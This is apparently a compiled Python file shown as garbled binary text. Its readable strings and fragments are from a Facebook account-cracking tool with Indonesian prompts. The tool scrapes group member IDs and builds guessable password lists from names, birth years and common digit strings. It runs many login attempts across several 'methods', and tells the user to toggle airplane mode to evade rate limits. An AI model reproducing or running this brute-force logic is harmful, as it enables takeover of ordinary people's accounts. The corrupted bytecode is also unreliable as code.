j        }|�                    dd�  �        }	 t%          |�  �        }|	�                    |�  �         �E#  Y �IxY wd|z   dz   dz   t)          |	d         �  �        z   } t+          | d��  �        }t-          t+          |d��  �        �  �         d} t+          | d��  �        }t-          t+          |d��  �        �  �         d |z   }t/          |�  �         d S )!Nz.# MAKE SURE THE PUBLIC GROUP ID IS NOT PRIVATE�cyanr  u   [•] INPUT ID/USERNAME GRUP : r<  r;  r:  r=  r?  z2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAINr@  r  rA  rC   rB  rC  z(# LIMIT ON OFF AIRPLANE MODE & TRY AGAIN�redrD  z# GROUP NOT FOUNDr  rG  rH  zGROUP NAME    : rx   zGROUP MEMBER : r   u,   [bold cyan] • GROUP TARGET •[/bold cyan]r  u=   [•] TO STOP PRESS CTRL+C
[•] IF STUCK ON OF AIRPLANE MODEu*   [bold cyan] • SUGGESTION •[/bold cyan]z5https://mbasic.facebook.com/browse/group/members/?id=)r  r  r   r�   r~   r�   �sopr   r�   r�   r�   �winr�   r�   r�   rJ  rK  rM  rN  r}   r   r�   r�   �pulkanid)�au�au2�idgrup�linkr�   �res�titt�titt2�xxb�totid�xb�totalid�tottalid�jumid�oi�linkms                   r   �	dump_grupr�  ]  s�  � �6���B�f����������S����
�1�
2�
2��-�f�4�������	��C�G�G�D�<�  2e�  #f�G�  g�  g�  l�  n{�  	|�  	|�#�#����+� 	� 	� 	�;�"��S�����#��%�%�+�+�c�����*�S�/�/�/��&�&�&�&�&�	���� 	�������	��	�	�=��	,�	,�	4�	4�^�B�	G�	G��	����1�"��S�����#��%�%�+�+�c�����*�S�/�/�/��&�&�&�&��[����"��S��!�!�!�#��%�%�+�+�c�����*�S�/�/�/��&�&�&�&�
�
�|�|�G����	��� � �R��G�'��_�_�Y�r�*�*�(���x�=�=�5��<�<���������4�������t�#�$5�5�c�%��(�m�m�C��	�"�F������s�2�C�D�D�D�E�E�E�F��	�"�F������s�2�A�B�B�B�C�C�C�>�v�E��	�%�����s   �,B
 �
A/C<�;C<�$I&�&I*c                 �p  �� t           �                    | dt          d         iddi��  �        j        }t	          j        d|�  �        }|D ]�}d|d         v rFt          �                    t	          j        d|d         �  �        d         d	z   |d
         z   �  �         n,t          �                    |d         d	z   |d
         z   �  �         t          j	        �
                    dt          t          �  �        z  �  �         t          j	        �                    �   �          ��d|v r^t          j        d�  �         t          dt!          |d�  �        �                    dd��  �        �                    d�  �        z   �  �         d S �fd�� �dt	          j        d| �  �        �                    d
�  �        z   �  �         d S )Nr�   r   �
user_agentrC   �r�   r>  z4\<h3\>\<a\ class\=".."\ href\="\/(.*?)"\>(.*?)<\/a\>zprofile.php?zid=(.*)r  r   u    [•] COLLECTING  %s IDzLihat Selengkapnyar$   rd  r?  r�   ��string�hrefc                 �  �� 	 t          j        | dt          d         i��  �        j        }t	          j        d|�  �        }t          |�  �        dk    �r |D �]}d|d         v r_t	          j        d|d         �  �        �                    d�  �        }|t          v r�Et          �
                    |dz   |d         z   �  �         n^t	          j        d	|d         �  �        �                    d�  �        }|t          v r��t          �
                    |dz   |d         z   �  �         t          j        �                    d
t          t          �  �        z  �  �         t          j        �                    �   �          ��d|v rF �dt          |d�  �        �                    dd��  �        �                    d�  �        z   �  �         d S t#          d�  �         t%          �   �          d S # t           j        j        $ r# t+          j        d�  �          �| �  �         Y d S t.          $ r! t#          d�  �         t%          �   �          Y d S w xY w)Nr�   r   r�   zL\<h3\ class\=".*?">\<span>\<strong>\<a\ href\="/(.*?)">(.*?)</a\>\</strong\>zprofile.phpzprofile.php\?id=(\d*)r   r  z(.*?)\?refidu     [•] COLLECTING %s IDzLihat Postingan Lainnyard  r?  r�   r�  r�  rx   r   )r~   r   �cokbrutr�   r�   r�   r
   r�   r�   r�   r}   r�   r�   r�   r�   r�  rJ  r   r4  r�   r�   r�   r�   rg  )�geyr�   r�   �cr   r)  s        �r   r)  zpulkanid.<locals>.geh�  s  �� ���l�3��'�!�*�5�6�6�6�;�A��j�b�cd�e�e�A�
�1�v�v�q�y�y�� S� S��	�!�A�$�	�	�	��+�A�a�D�	1�	1�	7�	7��	:�	:�q�
�r�'�'��
�	�	�!�C�%��!��*�����	��>�!�A�$�	'�	'�	-�	-�a�	0�	0�q�
�r�'�'��
�	�	�!�C�%��!��*����	�j���3�S��W�W�=�>�>�>��
�@P�@P�@R�@R�@R�@R� �A�%�%��S�	&�s�1�]�';�';�'@�'@��Le�'@�'f�'f�'j�'j�kq�'r�'r�	r�s�s�s�s�s�
�4�[�[�[��Y�Y�Y�Y�Y��
�
�
-� � � ��J�r�N�N�N��C��H�H�H�H�H�H�
� � � �	�$�K�K�K��I�I�I�I�I�I����s   �F9G �>G �3H=�&H=�<H=r<  zid=(\d*))r�   r   r�  r�   r�   r�   r�   r}   r�   r�   r�   r
   r�   r�   r�   r�  r�  rJ  r�   r�   )�linkmem�member�memberr�memr)  s       @r   r�  r�  �  s�  �� ������7�1�:� 6��b�?Q��R�R�W��	��N�v�	V�	V��� O� O�S��s�1�v����9�9�R�Z�	�#�a�&�)�)�!�,�S�0��Q��7�8�8�8�8��9�9�S��V�C�Z��A�������*���/��R���9�:�:�:�C�J�<L�<L�<N�<N�<N�<N��F�"�"��*�Q�-�-�-�
�(��V�M�)B�)B�)G�)G��Sg�)G�)h�)h�)l�)l�ms�)t�)t�t�u�u�u�u�u�� � � � �< �#�,�R�Y�{�7�-K�-K�-Q�-Q�RS�-T�-T�T�U�U�U�U�Ur   c            	      ��  � t          j        d�  �        } nX# t          $ rK t          d�  �         t          dt          � ��  �         t          j        d�  �         t          �   �          Y nw xY wt          | �  �        dk    rBt          d�  �         t          d�  �         t          j        d�  �         t          �   �          d S t          d�  �         t          t          � d	t          � ��  �         d}i }| D �]g}t          d
|z   d�  �        �                    �   �         }n#  Y �-xY w|dz  }|dk     r�dt          |�  �        z   }|�                    t          |�  �        t          |�  �        i�  �         |�                    |t          |�  �        i�  �         t          d|z   dz   |z   dz   t          t          |�  �        �  �        z   dz   t          z   �  �         ��|�                    t          |�  �        t          |�  �        i�  �         t          dt          |�  �        z   dz   |z   dz   t          t          |�  �        �  �        z   dz   t          z   �  �         ��it          d�  �         t          d�  �        }||         }n<# t          $ r/ t          d�  �         t          d�  �         t!          �   �          Y nw xY wt          d
|z   d�  �        �                    �   �         �                    �   �         }nG#  t          d�  �         t          d�  �         t          j        d�  �         t          �   �          Y nxY w|D ]}	t&          �                    |	�  �         �t+          �   �          d S )N�DUMPr�   u;   [1;97m├───[1;97m[[32m+[1;97m] input your File  r$   r   r  uN   {x}[1;97m├───[1;97m[[32m+[1;97m] Anda Tidak Memiliki File Dump {x}r7  u#   |———>> Daftar File Dump Anda zDUMP/rH   r   rd   ra   r�   r  z [ z
 Account ]�2   [1;97m├───[1;97m[[32m+[1;97m] Pilih : uD   [1;97m├───[1;97m[[32m+[1;97m] Pilih Yang Bener Lah Asuu u@   [1;97m├───[1;97m[[32m+[1;97m] File Tidak Di Temukan )r�   r  r  r   r�   r�   r�   r�   r
   r�   ry   r  r   r  r�   r�   r�   rz   r{   r�   r}   r4  )
r  r"  r#  r$  r%  r&  r(  r)  r+  �xids
             r   r�   r�   �  s,  � ��:�f���S�S��� 	� 	� 	���,�,�,��U�RS�U�U�V�V�V��*�Q�-�-�-��&�&�&�&�&�		����
 ��H�H�a�K�K���*�*�*��d�e�e�e��*�Q�-�-�-��&�&�&�&�&�������1�4�4��4�4�5�5�5�	�#�
�#�� D� D�c��'�#�+�c�"�"�,�,�.�.�s�s���(�(������6�3�	�"�f�f�
�c�#�h�h�,�C��J�J��C����S���"�#�#�#��J�J��C��H�H�~����	�#�c�'�$�,�s�
�5�
 ��S��X�X���
.�|�
;�A�
=�>�>�>�>��J�J��C����S���"�#�#�#�	�#�c�#�h�h�,�t�
�C�
��
%�c�#�c�(�(�m�m�
3�L�
@��
B�C�C�C�C������	�O�	P�	P�$���I�c�c��	� 
� 
� 
�������	[�\�\�\��6�6�6�6�6�
���� ����S�!�!�&�&�(�(�3�3�5�5�c�c��
���<�<�<��	W�X�X�X��:�a�=�=�=��6�6�6�6�6����� � �c��9�9�S�>�>�>�>�	�)�)�)�)�)s;   � �AA+�*A+�9%D�D#�=J �6J?�>J?�7K: �:AL>c                  �d  � t          d�  �         t          d�  �        } | dv r2t          t          �  �        D ]}t          �                    |�  �         �n�| dv rzg }t          t          �  �        D ]}|�                    |�  �         �t          |�  �        }|dz
  }t          |�  �        D ]'}t          �                    ||         �  �         |dz  }�(n| dv rMt          D ]D}t          j	        dt          t          �  �        �  �        }t          �
                    ||�  �         �En.t          dt          � d	t          � d
��  �         t          �   �          t          d�  �         t          dt          � dt          � d��  �        }|dv rt           �                    d�  �         �n�|dv rt           �                    d�  �         �n�|dv rt           �                    d�  �         �n�|dv rt           �                    d�  �         �n�|dv rt           �                    d�  �         �nr|dv rt           �                    d�  �         �nR|dv rt           �                    d�  �         �n2|dv rt           �                    d�  �         �n|dv rt           �                    d�  �         n�|dv rt           �                    d�  �         n�|d v rt           �                    d!�  �         n�|d"v rt           �                    d#�  �         n�|d$v rt           �                    d%�  �         nw|d&v rt           �                    d'�  �         nX|d(v rt           �                    d)�  �         n9|d*v rt           �                    d+�  �         nt           �                    d�  �         t          d,�  �         t#          �   �          d S )-Nr7  u�  [1;97m├──────────────━[93m㋱↟[1;92mMETODE CRACKING↟[93m㋱[1;97m━─
[1;97m│ ╭────────────────────────────────────────────────────╮
[1;97m│ │ [[32m1[1;97m] new      [[32m2[1;97m] olld                        │
[1;97m│ │ [[32m3[1;97m] Random      [[32m4[1;97m] AHMAD [[32m✓[1;97m]                    │
[1;97m│ ╰╭[[32mMETODE[1;97m]───────────────────────────────────────────╯
[1;97m│  ╰──➣[32m r�   r�   r   r�   r   r  rE  z] Pilih Yang Bener Kontoll ui   [1;97m├───[1;97m[[32m+[1;97m] Ketik ,[95m1778[1;97m, INPUT MITHOD CTRACK MITHOD 1 ALWAYS OPu   [1;97m│ ╭─[z METODE u�  [1;97m]─────────────────────────────────────────╮
[1;97m│ │ [[32m1[1;97m] Mobile V[32m1   [1;97m[[32m6[1;97m] Free         [1;97m[[32m11[1;97m] D-Fb         │
[1;97m│ │ [[32m2[1;97m] Mobile V[1;93m2   [1;97m[[32m7[1;97m] Touch        [1;97m[[32m12[1;97m] Web          │
[1;97m│ │ [[32m3[1;97m] Mobile V[1;94m3   [1;97m[[32m8[1;97m] Mbasic       [1;97m[[32m13[1;97m] Tools        │
[1;97m│ │ [[32m4[1;97m] Mobile V[1;95m4   [1;97m[[32m9[1;97m] B-Api[[1;91mCepat[1;97m] [1;97m[[32m14[1;97m] Vpn          │
[1;97m│ │ [[32m5[1;97m] Mobile V[1;96m5   [1;97m[[32m10[1;97m] X-Fb        [1;97m[[32m15[1;97m] Proxy        │
[1;97m│ ╰╭[[32mMETODE[1;97m]───────────────────────────────────────────╯
[1;97m│  ╰──➣ [32m)�ChangFBr�   �changfb�mobilev1�mobilev2�mobilev3r�   �mobilev4r�   �mobilev5r�   �free)r-   r�   �touch)r7   r�   �mbasic)r+   r�   �api)rN   rN   �xfb)rO   rO   �dfb)rP   rP   �web)�13r�  �tools)�14r�  �vpn)�15r�  �proxyu)   [1;97m├───[1;97m[[32m+[1;97m])r   r�   �sortedr�   �id2r}   r
   r  r�   �randintrf  r�   r�   r�   r4  r�   �method�passwrdlist)	�hu�tua�muda�bacot�bcm�bcmi�xmud�xx�hcs	            r   r4  r4  �  s�  � �������  C�  D�  D���*����B�Z�Z� � �c��:�:�c�?�?�?�?�� 	�J���	�$��b�z�z� � �e��;�;�u�����	�$�i�i�#��A��$��C�j�j� � �d��:�:�d�4�j�����!�8�4�4�� 	�J���� � �e���q��S���"�"�2��:�:�b������� �<��<�<�a�<�<�<�=�=�=�	�)�)�)��  E�  F�  F�  F��  @�C�  @�  @��  @�  @�  @�  A�  A���
����-�-�	������J����-�-�
������J����-�-�
������J����-�-�
������J����-�-�
������J����-�-�
������J����-�-�������J����-�-�������J����-�-�������J����-�-�������K����-�-�������K����-�-�������K����-�-�������K����-�-�������K����-�-�������K����-�-�������-�-�	�����>�?�?�?������r   c                  ��  � t          d�  �         t          dt          � dt          � d��  �         t          d�  �         t          d�  �         t          d�  �         t          d�  �         t          d	�  �         t	          d
�  �        } | dv rt          �   �          d S | dv rt          �   �          d S | dv rt          �   �          d S | dv rt          �   �          d S t           d S )Nud   [1;97m├───[1;97m[[32m+[1;97m]  [95mAHMAD[1;97m, INPUT LIST CTRACK PASSWORD 1 ALWAYS OPr�   z	List passr�   uN   
[1;97m│ │ [[32m1[1;97m] PASS LIST ONLY NAME DIGT PASS [32m[FAST BEST]uO   
[1;97m│ │ [[32m2[1;97m] PASS LIST ONLY NAME BIRTH PASS [32m[FAST BEST]uN   
[1;97m│ │ [[32m3[1;97m] PASS LIST ONLY NUMBER PASS [32m[ONLY ARAB ID]uf   
[1;97m│ │ [[32m4[1;97m] PASS LIST ALL PASSWORD IN THIS LIST NOT GOOD [[1;91mVERY SLOW[1;97m]z
[1;97m] Input[1;97m]r�   r�   r�   r�   r�   )
r   r�   r�   r�   r�   �passwrd�birth�number�
passwrdallr�  )r  s    r   r�  r�  (  s)  � �	�  C�  D�  D�  D�	�  �A�  �  ��  �  �  �  @�  @�  @�	�
g�h�h�h�	�
h�i�i�i�	�
g�h�h�h�	�  C�  D�  D�  D�	�
*�+�+�+��C�D�D���:�%�%��	�	�	�	�	�	�Z�	'�	'�������	�Z�	'�	'�������	�Z�	'�	'����������r   c                  �  � t          dt          � dt          � dt          � dt          � dt          � dt          � d�t          z  �  �         t          dt          � dt          � dt          � d	t          � dt          � dt          � d�t
          z  �  �         t          d
t          � d��  �         t          d�  �         t          d��  �        5 } t          D �]�}|�	                    d�  �        d         |�	                    d�  �        d         �
                    �   �         }}|�	                    d�  �        d         }dg}t          |�  �        dk     �r�t          |�  �        dk     r�n�|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |d z   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   �  �         |�                    d|z   �  �         |�                    d|z   �  �         �n�t          |�  �        dk     r|�                    |�  �         �n�|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |d z   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   �  �         |�                    d|z   �  �         |�                    d|z   �  �         d!t          v r t          D ]}|�                    |�  �         �n	 d"t          v r| �                    t"          ||�  �         ��{d#t          v r| �                    t$          ||�  �         ���d$t          v r| �                    t&          ||�  �         ���d%t          v r| �                    t(          ||�  �         ���d&t          v r| �                    t*          ||�  �         ��d't          v r| �                    t,          ||�  �         ��>d(t          v r| �                    t.          ||�  �         ��ed)t          v r| �                    t0          ||�  �         ���d*t          v r| �                    t2          ||�  �         ���d+t          v r| �                    t4          ||�  �         ���d,t          v r| �                    t6          ||�  �         ��d-t          v r| �                    t8          ||�  �         ��(d.t          v r| �                    t:          ||�  �         ��Od/t          v r| �                    t<          ||�  �         ��vd0t          v r| �                    t>          ||�  �         ���d1t          v r| �                    t@          ||�  �         ���| �                    t"          ||�  �         ���	 d d d �  �         n# 1 swxY w Y   tC          d�  �         d2}tE          �   �         �!                    tG          |d3�4�  �        �  �         tI          t          d5z   �  �        }|d6v rtK          �   �          d S tM          �   �          d S )7N��   [1;97m│ ╭────────────────────────────────────────────────────╮
[1;97m│ │ [rE  r  r  � Tersimpan Di : rF  �     [1;97m│�   [1;97m│ │ [r
  �'   [1;97m│ ╰────────[�G   MAINKAN MODE PESAWAT SETIAP 1K ID[1;97m]─────────╯r�   �   ��max_workersr  r   r   rM   rC   �   r�  �123�1234�12345�123456�	123456789�
1234567890rP   �1122�2022�321�54321�yar�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  �)# WANT TO SHOW CHECKPOINT OPTIONS ? (y/t)r  r  r�  �r   r^   �'r�   r�   r�   �okcr�   �cpcrU   �tredr�  r  �lowerr
   r}   �pwpluss�pwnyar�  �submitr�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r   r  r  r�   �cek_opsir�   �	�pool�yuzong�idf�nmf�frs�pwv�xpwd�tanya�wois	            r   r�  r�  ;  s_  � ��  P�  PQ�  P�  P�  VW�  P�  P�  ab�  P�  P�  fg�  P�  P�  yz�  P�  P�  ~�  P�  P�  P�  RU�  V�  W�  W�  W��]�Q�]�]�1�]�]�a�]�]�1�]�]�a�]�]�1�]�]�]�_b�c�d�d�d��  B�A�  B�  B�  B�  C�  C�  C��v����
�r���� V!�d�� U!� U!�f��\�\�#���q�!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�
��3�	�#�h�h�q�j�j�
�3�x�x��z�z�	��Z�Z��_�_�_��Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��H������Z�Z��K�� � � ��Z�Z��L� �!�!�!��Z�Z��D������Z�Z��F�
�����Z�Z��F�
�����Z�Z��E�	�����Z�Z��G������Z�Z��c�	�%�� � � ��Z�Z��s�
�6�!�"�"�"��Z�Z����G�#�$�$�$��Z�Z��c�	�����Z�Z��s�
�����Z�Z��������
�3�x�x��z�z��Z�Z��_�_�_�_��Z�Z��_�_�_��Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��H������Z�Z��K�� � � ��Z�Z��L� �!�!�!��Z�Z��D������Z�Z��F�
�����Z�Z��F�
�����Z�Z��E�	�����Z�Z��G������Z�Z��c�	�%�� � � ��Z�Z��s�
�6�!�"�"�"��Z�Z����G�#�$�$�$��Z�Z��c�	�����Z�Z��s�
�����Z�Z�������
�g�o�o�� � ���Z�Z���������6����K�K���C� � � � ��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��&����K�K��S�������6����K�K��c�#������F����K�K��s�3����������K�K��C�����������K�K��C�����������K�K��C�����������K�K��C�������6����K�K��c�#����������K�K��C�������6����K�K��c�#������K�K���C� � � � �kU!�V!� V!� V!� V!� V!� V!� V!� V!� V!� V!� V!���� V!� V!� V!� V!�n �r����	4�������T�%�w�'�'�'�(�(�(��Q�O�O�P�P���9���
�*�*�*�*�*��&�&�&�&�&s   �[*^?�?_�_c                  �  � t          dt          � dt          � dt          � dt          � dt          � dt          � d�t          z  �  �         t          dt          � dt          � dt          � d	t          � dt          � dt          � d�t
          z  �  �         t          d
t          � d��  �         t          d�  �         t          d��  �        5 } t          D �]�}|�	                    d�  �        d         |�	                    d�  �        d         �
                    �   �         }}|�	                    d�  �        d         }dg}t          |�  �        dk     �r�t          |�  �        dk     r�nV|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |d z   �  �         |�                    |d!z   �  �         |�                    |d"z   �  �         |�                    |d#z   �  �         |�                    |d$z   �  �         |�                    |d%z   �  �         �n�t          |�  �        dk     r|�                    |�  �         �n�|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |d z   �  �         |�                    |d!z   �  �         |�                    |d"z   �  �         |�                    |d#z   �  �         |�                    |d$z   �  �         |�                    |d%z   �  �         d&t          v r t          D ]}|�                    |�  �         �n	 d't          v r| �                    t"          ||�  �         ��9d(t          v r| �                    t$          ||�  �         ��`d)t          v r| �                    t&          ||�  �         ���d*t          v r| �                    t(          ||�  �         ���d+t          v r| �                    t*          ||�  �         ���d,t          v r| �                    t,          ||�  �         ���d-t          v r| �                    t.          ||�  �         ��#d.t          v r| �                    t0          ||�  �         ��Jd/t          v r| �                    t2          ||�  �         ��qd0t          v r| �                    t4          ||�  �         ���d1t          v r| �                    t6          ||�  �         ���d2t          v r| �                    t8          ||�  �         ���d3t          v r| �                    t:          ||�  �         ��d4t          v r| �                    t<          ||�  �         ��4d5t          v r| �                    t>          ||�  �         ��[d6t          v r| �                    t@          ||�  �         ���| �                    t"          ||�  �         ���	 d d d �  �         n# 1 swxY w Y   tC          d�  �         d7}tE          �   �         �!                    tG          |d8�9�  �        �  �         tI          t          d:z   �  �        }|d;v rtK          �   �          d S tM          �   �          d S )<Nr�  rE  r  r  r�  rF  r�  r�  r
  r�  r�  r�   r�  r�  r  r   r   rM   rC   r�  r�  �2001�2002�2003�2004�2005�2000�1999�1998�1997�1996�1995�1994�1993�1992�1991�1990r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r  r  r�  r�  r�  r  s	            r   r�  r�  �  s  � ��  P�  PQ�  P�  P�  VW�  P�  P�  ab�  P�  P�  fg�  P�  P�  yz�  P�  P�  ~�  P�  P�  P�  RU�  V�  W�  W�  W��]�Q�]�]�1�]�]�a�]�]�1�]�]�a�]�]�1�]�]�]�_b�c�d�d�d��  B�A�  B�  B�  B�  C�  C�  C��v����
�r���� T!�d�� S!� S!�f��\�\�#���q�!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�
��3�	�#�h�h�q�j�j�
�3�x�x��z�z�	��Z�Z��_�_�_��Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����
�3�x�x��z�z��Z�Z��_�_�_�_��Z�Z��_�_�_��Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
�����Z�Z��F�
����
�g�o�o�� � ���Z�Z���������6����K�K���C� � � � ��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��&����K�K��S�������6����K�K��c�#������F����K�K��s�3����������K�K��C�����������K�K��C�����������K�K��C�����������K�K��C�������6����K�K��c�#����������K�K��C�������6����K�K��c�#������K�K���C� � � � �gS!�T!� T!� T!� T!� T!� T!� T!� T!� T!� T!� T!���� T!� T!� T!� T!�j �r����	4�������T�%�w�'�'�'�(�(�(��Q�O�O�P�P���9���
�*�*�*�*�*��&�&�&�&�&s   �Z(]=�=^�^c                  �
  � t          dt          � dt          � dt          � dt          � dt          � dt          � d�t          z  �  �         t          dt          � dt          � dt          � d	t          � dt          � dt          � d�t
          z  �  �         t          d
t          � d��  �         t          d�  �         t          d��  �        5 } t          D �]�}|�	                    d�  �        d         |�	                    d�  �        d         �
                    �   �         }}|�	                    d�  �        d         }g d�}t          |�  �        dk     r*t          |�  �        dk     rnT|�                    |�  �         n>t          |�  �        dk     r|�                    |�  �         n|�                    |�  �         dt          v r t          D ]}|�                    |�  �         �n	 dt          v r| �                    t"          ||�  �         ��6dt          v r| �                    t$          ||�  �         ��]dt          v r| �                    t&          ||�  �         ���dt          v r| �                    t(          ||�  �         ���dt          v r| �                    t*          ||�  �         ���dt          v r| �                    t,          ||�  �         ���dt          v r| �                    t.          ||�  �         �� dt          v r| �                    t0          ||�  �         ��Gdt          v r| �                    t2          ||�  �         ��nd t          v r| �                    t4          ||�  �         ���d!t          v r| �                    t6          ||�  �         ���d"t          v r| �                    t8          ||�  �         ���d#t          v r| �                    t:          ||�  �         ��
d$t          v r| �                    t<          ||�  �         ��1d%t          v r| �                    t>          ||�  �         ��Xd&t          v r| �                    t@          ||�  �         ��| �                    t"          ||�  �         ���	 d d d �  �         n# 1 swxY w Y   tC          d'�  �         d(}tE          �   �         �!                    tG          |d)�*�  �        �  �         tI          t          d+z   �  �        }|d,v rtK          �   �          d S tM          �   �          d S )-Nr�  rE  r  r  r�  rF  r�  r�  r
  r�  r�  r�   r�  r�  r  r   r   rM   )�
1234554321r�  �12345678�
1122334455�112233445566r�  �
1234512345r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  rC   r�  r  r  r�  r�  r�  r  s	            r   r�  r�    sE  � ��  P�  PQ�  P�  P�  VW�  P�  P�  ab�  P�  P�  fg�  P�  P�  yz�  P�  P�  ~�  P�  P�  P�  RU�  V�  W�  W�  W��]�Q�]�]�1�]�]�a�]�]�1�]�]�a�]�]�1�]�]�]�_b�c�d�d�d��  B�A�  B�  B�  B�  C�  C�  C��v����
�r���� 4!�d�� 3!� 3!�f��\�\�#���q�!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�	a�	a�	a�3�	�#�h�h�q�j�j�
�3�x�x��z�z�	��Z�Z��_�_�_�_�
�3�x�x��z�z��Z�Z��_�_�_�_��Z�Z��_�_�_�
�g�o�o�� � ���Z�Z���������6����K�K���C� � � � ��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��f����K�K���S�!�!�!�!��&����K�K��S�������6����K�K��c�#������F����K�K��s�3����������K�K��C�����������K�K��C�����������K�K��C�����������K�K��C�������6����K�K��c�#����������K�K��C�������6����K�K��c�#������K�K���C� � � � �g3!�4!� 4!� 4!� 4!� 4!� 4!� 4!� 4!� 4!� 4!� 4!���� 4!� 4!� 4!� 4!�j �r����	4�������T�%�w�'�'�'�(�(�(��Q�O�O�P�P���9���
�*�*�*�*�*��&�&�&�&�&s   �N%Q:�:Q>�Q>c                  �  � t          dt          � dt          � dt          � dt          � dt          � dt          � d�t          z  �  �         t          dt          � dt          � dt          � d	t          � dt          � dt          � d�t
          z  �  �         t          d
t          � d��  �         t          d�  �         t          d��  �        5 } t          D �]u}|�	                    d�  �        d         |�	                    d�  �        d         �
                    �   �         }}|�	                    d�  �        d         }dg}t          |�  �        dk     �r�t          |�  �        dk     r�n-|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |d z   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   �  �         |�                    d|z   �  �         |�                    d|z   �  �         |�                    |d!z   �  �         |�                    |d"z   �  �         |�                    |d#z   �  �         |�                    |d$z   �  �         |�                    |d%z   �  �         |�                    |d&z   �  �         |�                    |d'z   �  �         |�                    |d(z   �  �         �n�t          |�  �        dk     r|�                    |�  �         �n�|�                    |�  �         |�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |d z   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   dz   �  �         |�                    d|z   �  �         |�                    d|z   �  �         |�                    d|z   �  �         |�                    |d!z   �  �         |�                    |d"z   �  �         |�                    |d#z   �  �         |�                    |d$z   �  �         |�                    |d%z   �  �         |�                    |d&z   �  �         |�                    |d'z   �  �         |�                    |d(z   �  �         d)t          v r t          D ]}|�                    |�  �         �n	 d*t          v r| �                    t"          ||�  �         ��d+t          v r| �                    t$          ||�  �         ��7d,t          v r| �                    t&          ||�  �         ��^d-t          v r| �                    t(          ||�  �         ���d.t          v r| �                    t*          ||�  �         ���d/t          v r| �                    t,          ||�  �         ���d0t          v r| �                    t.          ||�  �         ���d1t          v r| �                    t0          ||�  �         ��!d2t          v r| �                    t2          ||�  �         ��Hd3t          v r| �                    t4          ||�  �         ��od4t          v r| �                    t6          ||�  �         ���d5t          v r| �                    t8          ||�  �         ���d6t          v r| �                    t:          ||�  �         ���d7t          v r| �                    t<          ||�  �         ��d8t          v r| �                    t>          ||�  �         ��2d9t          v r| �                    t@          ||�  �         ��Y| �                    t"          ||�  �         ��w	 d d d �  �         n# 1 swxY w Y   tC          d�  �         d:}tE          �   �         �!                    tG          |d;�<�  �        �  �         tI          t          d=z   �  �        }|d>v rtK          �   �          d S tM          �   �          d S )?Nr�  rE  r  r  r�  rF  r�  r�  r
